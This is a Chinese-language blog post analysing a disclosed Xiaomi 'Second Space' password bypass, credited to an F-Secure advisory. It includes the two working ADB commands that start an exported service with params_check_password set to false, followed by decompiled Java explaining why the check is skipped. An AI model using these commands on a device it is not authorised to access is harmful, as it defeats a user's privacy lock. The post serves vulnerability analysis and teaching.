---
layout: post
title:  "REDMI 5 Plus Second Space Password Bypass"
date:   2020-06-10 18:00:00 +520
categories: Android_Security
tags: [Framework, LogicBug, ExportedComponent]
---

这个漏洞来自F-Secure实验室
- https://labs.f-secure.com/advisories/xiaomi-second-space

一句话描述就是：通过ADB命令启动一个Service就可以绕过小米Second Space的密码校验

我有一台Mix 2，刚好可以用于测试

Second Space的中文版本叫作`手机分身`

![](/assets/resources/DEC8A5C4B85CB1E7735AB3530F29BD12.jpg)

点击`开启手机分身`，会进入设置，两个密码，一个密码用于进入分身，一个密码用于回到主系统

这个漏洞的作用，就是让攻击者不需要密码，也可以进入分身，并且在主系统与分身之间自由切换

一共两条命令
```shell
➜ SECOND_USER=`adb shell pm list users | grep -o "{[0-9]*" | tr -d '{' | tail -n 1`
➜ adb shell am start-service --ez params_check_password False --ei params_target_user_id $SECOND_USER -a com.miui.xspace.TO_CHANGE_USER
```

第一条命令用于查询当前手机里的用户，`| grep -o "{[0-9]*" | tr -d '{' | tail -n 1`用于过滤出`11`这个字段
```shell
➜ adb shell pm list users
Users:
	UserInfo{0:机主:13} running
	UserInfo{11:security space:13} running
```

第二条命令可以说是最为关键，我们对其进行参数拆分
```shell
adb shell am start-service // 通过ADB命令启动Service
    --ez params_check_password False // boolean类型参数
    --ei params_target_user_id $SECOND_USER // int类型参数
    -a com.miui.xspace.TO_CHANGE_USER // 指定的Action
```

我们现在知道了这个Service响应的Action是`"com.miui.xspace.TO_CHANGE_USER"`

根据F-Secure的文章提示找到应用`com.miui.securitycore`

当然了，你想自己通过全局爆搜APK字符串也是可以的

这是实现Space切换的Service

![IMAGE](/assets/resources/EB405B9E46F294F27D622AED92854C57.jpg)

查看AndroidManifest文件的定义，有`<intent-filter>`默认导出
```xml
<service 
    android:name="com.miui.securityspace.service.SwitchUserService"
    android:permission="android.permission.INTERACT_ACROSS_USERS" 
    android:process="com.miui.securitycore.remote">
    <intent-filter>
        <action android:name="com.miui.xspace.TO_CHANGE_USER" />
    </intent-filter>
</service>
```

获取四个Intent字段后，调用`checkPasswordBeforeSwitch()`，`mTargetUserId`就是上文提到的`11`
```java
public int onStartCommand(Intent intent, int arg7, int arg8) {
    this.mDelayTime = intent.getLongExtra("com.miui.xspace.preference_delay_time", 300);
    this.mFromType = intent.getStringExtra("com.miui.xspace.preference_from_type");
    this.mTargetUserId = intent.getIntExtra("params_target_user_id", -10000);
    this.mIsNeedcheckPassword = intent.getBooleanExtra("params_check_password", true);
    Log.d("SwitchUserService", "mTargetUserId: " + this.mTargetUserId);
    if(this.mTargetUserId != -10000) {
        this.checkPasswordBeforeSwitch(this.mTargetUserId);
    }

    this.stopSelf();
    return super.onStartCommand(intent, arg7, arg8);
}
```

`needCloseSdcardFs()`返回的固定值`0`，所以第一个`if`块不会进入，第二个`if`块有两个判断条件，`!mIsNeedcheckPassword`和`!isSecure()`，只需要满足其中一个就可以进入`if`块，而Poc中设置的`"params_check_password"`字段为`False`，所以这个`if`块就是我们关注的重点
```java
private void checkPasswordBeforeSwitch(int mTargetUserId) {
    Intent intent;
    
    // private boolean needCloseSdcardFs(int arg2) { return 0; }
    if(this.needCloseSdcardFs(mTargetUserId)) {
        intent = new Intent(((Context)this), SdcardFsDialogActivity.class);
        intent.setFlags(0x10000000);
        this.startActivity(intent);
        return;
    }

    if(!this.mIsNeedcheckPassword || !SpaceManagerWrapper.getInstance().isSecure(mTargetUserId)) {
        int v1 = SpaceManagerWrapper.getInstance().switchUser(mTargetUserId);
        if(v1 == 0) {
            AnalyticsHelper.trackSwitchUser(mTargetUserId, this.mFromType);
        }
        else if(2 == v1) {
            ToastUtils.makeText(((Context)this), this.getResources().getString(0x7F09014B), 0).show(); // Can't switch between spaces during a call
        }
        else if(3 == v1) {
            ToastUtils.makeText(((Context)this), this.getResources().getString(0x7F09018B), 0).show(); // Switching to Second space is restricted by parental controls
        }
        else if(4 == v1) {
            ToastUtils.makeText(((Context)this), this.getResources().getString(0x7F0901CC), 0).show(); // Can't switch between spaces when Ultra battery saver is on
        }
    }
    else {
        intent = new Intent(((Context)this), SwitchUserConfirmActivity.class);
        intent.addFlags(0x10008000);
        intent.putExtra("preference_key_user_id", mTargetUserId);
        intent.putExtra("com.miui.xspace.preference_delay_time", this.mDelayTime);
        intent.putExtra("com.miui.xspace.preference_from_type", this.mFromType);
        this.startActivityAsUser(intent, new UserHandle(CrossUserUtils.getCurrentUserId()));
    }
}
```

这个`if`块的第一句代码就是调用`switchUser()`，一共有三个判断
```java
public int switchUser(int mTargetUserId) {
    if(DeviceUtil.isPhoneCalling(this.mContext)) {
        Log.d("SpaceManagerWrapper", "Can\'t switch user to " + mTargetUserId + " when calling.");
        return 2;
    }

    if(MiuiSettings$Secure.isGreenKidActive(this.mContext.getContentResolver())) {
        Log.d("SpaceManagerWrapper", "Can\'t switch user to " + mTargetUserId + " when green kid active.");
        return 3;
    }

    if(MiuiSettings$System.isSuperSaveModeOpen(this.mContext, 0)) {
        Log.d("SpaceManagerWrapper", "Can\'t switch user to " + mTargetUserId + " when super power active.");
        return 4;
    }

    if(this.mSpaceManager.switchUser(mTargetUserId)) {
        return 0;
    }

    return 1;
}
```

第一个判断，如果当前有电话打进来或者正在接电话，不进行Space切换
```java
CALL_STATE_STATE_IDLE = 0;
CALL_STATE_STATE_RUNNING = 1;
CALL_STATE_STATE_OFFHOOK = 2;

public static boolean isPhoneCalling(Context context) {
    boolean result = true;
    int callState = context.getSystemService("phone").getCallState();
    if(callState != 1 && callState != 2) {
        result = false;
    }

    return result;
}
```

第二个判断和第三个判断，有一点点棘手，因为它调用到了Framework代码，小米在这一层多了相当多的定制
```java
import android.provider.MiuiSettings$Secure;
import android.provider.MiuiSettings$System;

if(MiuiSettings$Secure.isGreenKidActive(this.mContext.getContentResolver())) {
    Log.d("SpaceManagerWrapper", "Can\'t switch user to " + mTargetUserId + " when green kid active.");
    return 3;
}

if(MiuiSettings$System.isSuperSaveModeOpen(this.mContext, 0)) {
    Log.d("SpaceManagerWrapper", "Can\'t switch user to " + mTargetUserId + " when super power active.");
    return 4;
}
```

解析boot-framework.vdex，会获得三个cdex，再解析三个cdex文件为dex文件即可

![IMAGE](/assets/resources/C6FE99F25A99F5D480D2D8DF6827060C.jpg)

JEB分析一波，可以直接找到两个方法，正常情况下这两个方法都返回`false`，可以不用过多关注

![IMAGE](/assets/resources/6D15B242DBB968006CBF5027ACFA08A1.jpg)

最后就是切换Space啦
```java
if(this.mSpaceManager.switchUser(mTargetUserId)) {
    return 0;
}
```

这后面又会调用到Framework的代码，咱们就不进行展开了

有生之年一定要认识一下F-Secure的大佬们，给大佬们一人带一双温州皮鞋穿穿